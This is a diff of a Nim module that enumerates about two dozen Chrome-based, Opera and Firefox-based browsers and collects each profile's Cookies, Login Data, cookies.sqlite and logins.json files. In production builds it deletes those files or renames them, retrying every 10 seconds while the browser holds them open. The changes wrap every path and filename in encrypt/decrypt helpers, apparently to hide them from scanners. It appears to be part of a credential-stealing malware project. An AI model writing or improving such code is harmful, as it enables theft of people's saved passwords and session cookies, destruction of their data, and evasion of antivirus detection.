@@ -1,8 +1,11 @@
-from os import sleep
+## THIS THREAD MIGHT NEED OPTIMIZATIONS 
+## BECAUSE OF THE CONSTANT ENCRYPTING AND DECRYPTING
+## OF STRING LITERALS
+
 from os import `/`
 from os import getEnv
 from os import walkDir
-from os import PathComponent
+from os import PathComponent # pcDir
 from os import existsDir
 from os import existsFile
 
@@ -10,12 +13,11 @@ from strutils import startsWith
 
 from ../constants import isProd
 
-from ../flags import BROWSER_THREAD_REMOVE_FILE
+from ../functions/hideString import e
+from ../functions/hideString import d
 
-when BROWSER_THREAD_REMOVE_FILE:
-  from os import tryRemoveFile
-else:
-  from os import moveFile
+when isProd:
+  from ../functions/removeFile import removeFileOrSleep
 
 type
   BROWSER_TYPES = enum
@@ -36,43 +38,43 @@ const browsers: array[3, browserType] = [
   (
     CHROME_BASED,
     @[
-      r"Google\Chrome",
-      r"Microsoft\Edge",
-      r"7Star\7Star",
-      r"Amigo",
-      r"BraveSoftware\Brave-Browser",
-      r"CentBrowser",
-      r"Chedot",
-      r"Google\Chrome SxS",
-      r"Chromium",
-      r"CocCoc\Browser",
-      r"Comodo\Dragon",
-      r"Elements Browser",
-      r"Epic Privacy Browser",
-      r"Kometa",
-      r"Orbitum",
-      r"Sputnik\Sputnik",
-      r"Torch",
-      r"uCozMedia\Uran",
-      r"Vivaldi",
-      r"Yandex\YandexBrowse"
+      e"Google\Chrome",
+      e"Microsoft\Edge",
+      e"7Star\7Star",
+      e"Amigo",
+      e"BraveSoftware\Brave-Browser",
+      e"CentBrowser",
+      e"Chedot",
+      e"Google\Chrome SxS",
+      e"Chromium",
+      e"CocCoc\Browser",
+      e"Comodo\Dragon",
+      e"Elements Browser",
+      e"Epic Privacy Browser",
+      e"Kometa",
+      e"Orbitum",
+      e"Sputnik\Sputnik",
+      e"Torch",
+      e"uCozMedia\Uran",
+      e"Vivaldi",
+      e"Yandex\YandexBrowse"
     ]
   ),
   (
     OPERA_BASED,
     @[
-      r"Opera Software\Opera Stable"
+      e"Opera Software\Opera Stable"
     ]
   ),
   (
     FIREFOX_BASED,
     @[
-      r"Mozilla\Firefox\Profiles",
-      r"NETGATE Technologies\BlackHawk",
-      r"8pecxstudios\Cyberfox",
-      r"Comodo\IceDragon",
-      r"K-Meleon,",
-      r"Mozilla\icecat"
+      e"Mozilla\Firefox\Profiles",
+      e"NETGATE Technologies\BlackHawk",
+      e"8pecxstudios\Cyberfox",
+      e"Comodo\IceDragon",
+      e"K-Meleon,",
+      e"Mozilla\icecat"
     ]
   ),
 ]
@@ -84,28 +86,6 @@ proc getNoOfThreads(): int =
 
 const noOfThreads: int = getNoOfThreads()
 
-proc removeFileOrSleep(src: string, doSleep: bool = false): void =
-  const sleepTime: int = 10 # 10 secs
-
-  if doSleep:
-    sleep(sleepTime * 1000)
-
-  var worked: bool = true
-
-  when BROWSER_THREAD_REMOVE_FILE:
-    worked = tryRemoveFile(src)
-  else:
-    try:
-      # rename file from `x` to `x_`
-      moveFile(src, src & "_")
-    except OSError:
-      removeFileOrSleep(src, true)
-
-  if not worked:
-    # try to remove file every `sleepTime` secs
-    # am nev de asta pt ca daca browserul este deschis
-    # nu pot sterge fisierul
-    removeFileOrSleep(src, true)
 
 proc initSearchThread(args: browserThreadArgs): void {.thread.} =
   let (based, folder, appdata, localappdata) = args
@@ -122,20 +102,20 @@ proc initSearchThread(args: browserThreadArgs): void {.thread.} =
       if isOpera:
         appdata / folder
       else:
-        localappdata / folder / "User Data"
+        localappdata / folder / d e"User Data"
 
     if existsDir(fullFolder):
       # add default user data
-      files.add r"Default\Cookies"
-      files.add r"Default\Login Data"
+      files.add d e"Default\Cookies"
+      files.add d e"Default\Login Data"
 
       for kind, maybeProfile in walkDir(fullFolder, true):
         if kind == pcDir:
           # if maybeProfile is a profile
-          if maybeProfile.startsWith("Profile"):
+          if maybeProfile.startsWith(d e"Profile"):
             # maybeProfile is now for sure a profile
-            files.add maybeProfile / "Cookies"
-            files.add maybeProfile / "Login Data"
+            files.add maybeProfile / d e"Cookies"
+            files.add maybeProfile / d e"Login Data"
 
   of FIREFOX_BASED:
     fullFolder = appdata / folder
@@ -143,8 +123,8 @@ proc initSearchThread(args: browserThreadArgs): void {.thread.} =
     if existsDir(fullFolder):
       for kind, profile in walkDir(fullFolder, true):
         if kind == pcDir:
-          files.add profile / "cookies.sqlite"
-          files.add profile / "logins.json"
+          files.add profile / d e"cookies.sqlite"
+          files.add profile / d e"logins.json"
 
   for file in files:
     let fullPath: string = fullFolder / file
@@ -159,16 +139,24 @@ proc initSearchThread(args: browserThreadArgs): void {.thread.} =
 
 proc initBrowserThread*(): void {.thread.} =
   let
-    appdata: string = getEnv("appdata")
-    localappdata: string = getEnv("localappdata")
+    appdata: string = getEnv(d e"appdata")
+    localappdata: string = getEnv(d e"localappdata")
 
   var
     threads: seq[browserThreadType] = newSeq[browserThreadType](noOfThreads)
     i = 0
   for browser in browsers:
     for folder in browser.folders:
-      createThread(threads[i], initSearchThread, (browser.based,
-          folder, appdata, localappdata))
+      createThread(
+        threads[i],
+        initSearchThread,
+        (
+          browser.based,
+          d folder, # decrypt folder
+          appdata,
+          localappdata
+        )
+      )
       i += 1
 
   joinThreads(threads)
